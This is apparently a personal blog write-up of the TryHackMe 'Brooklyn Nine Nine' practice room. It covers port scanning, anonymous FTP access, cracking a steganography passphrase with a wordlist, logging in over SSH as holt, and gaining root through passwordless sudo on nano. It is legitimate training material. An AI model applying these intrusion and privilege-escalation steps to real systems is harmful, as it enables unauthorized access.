---
layout: post
current: post
cover: 'assets/images/brooklynninenine/cover.png'
navigation: True
title: "Brooklyn Nine Nine Write Up"
date: 2021-01-01 00:00:00
tags: [tryhackme, ctf, easy]
class: post-template
subclass: 'post'
author: darryn
---
![brooklynninenine](/assets/images/brooklynninenine/cover.png)

### Overview

[Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine) is a easy room on [TryHackMe](https://tryhackme.com) by Fsociety2006. 

### Nmap

I deployed the machine and was given the target IP 10.10.130.161. I started a NMAP scan to check the available ports. 

```highlight
└──╼ $sudo nmap -sC -sV -oN initial 10.10.130.161
[sudo] password for daz: 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 14:26 GMT
Nmap scan report for 10.10.130.161
Host is up (0.070s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

3 Ports open:

- 21 - FTP - Anonymous log in allowed with a note
- 22 - SSH - Banner is showing its an Ubuntu machine
- 80 - HTTP - Apache web server version 2.4.29

I also ran a full port scan but no additional ports were found.

### Enumeration

As the FTP service allows anonymous access I started by logging in with the username 'anonymous' and the password 'anonymous'.

```highlight
└──╼ $ftp 10.10.130.161
Connected to 10.10.130.161.
220 (vsFTPd 3.0.3)
Name (10.10.130.161:daz): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.03 secs (4.3601 kB/s)
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> 
```

I downloaded the note_to_jake.txt file but couldn't find anything else. The note reads:
>
>From Amy,
>
>Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
>

The note indicates a weak password being used, I moved on to port 80 and looked at the web page. 

```highlight
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("brooklyn99.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
</head>
<body>

<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>
```

The page just displays an image of Brooklyn nine nine, however looking at the source provides a comment regarding steganography. 

### Initial Access

I downloaded the image and ran steghide however the I cant extract the data with out a password. I used [StegSeek](https://github.com/RickdeJager/stegseek) and the rockyou.txt word list to crack the password.

```highlight
└──╼ $stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegSeek version 0.5
Progress: 0.00% (0 bytes)           

[i] --> Found passphrase: "<REDACTED>"
[i] Original filename: "note.txt"
[i] Extracting to "brooklyn99.jpg.out"
┌─[daz@parrot]─[~/Documents/TryHackMe/Brooklyn99]
└──╼ $cat brooklyn99.jpg.out
Holts Password:
flu<REDACTED>

Enjoy!!
```

Great I now have some credentials. Using the credentials I can now SSH in to the machine.

```highlight
└──╼ $ssh holt@10.10.130.161
holt@10.10.130.161's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ 
holt@brookly_nine_nine:~$ 
```

### Priv Esc

The privilege escalation was really simple, doing a sudo -l, all users can run /bin/nano without a password. Going to [GTFOBins](https://gtfobins.github.io) shows the steps required to abuse this and get root.

```highlight
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

Following the steps, I get a root shell.

```highlight
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
brookly_nine_nine
# cd /root
# ls
root.txt
#
```
Thanks for reading!

============================================================

Any comments or feedback welcome! You can find me on [twitter](https://twitter.com/dazbrownfield).

<a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>

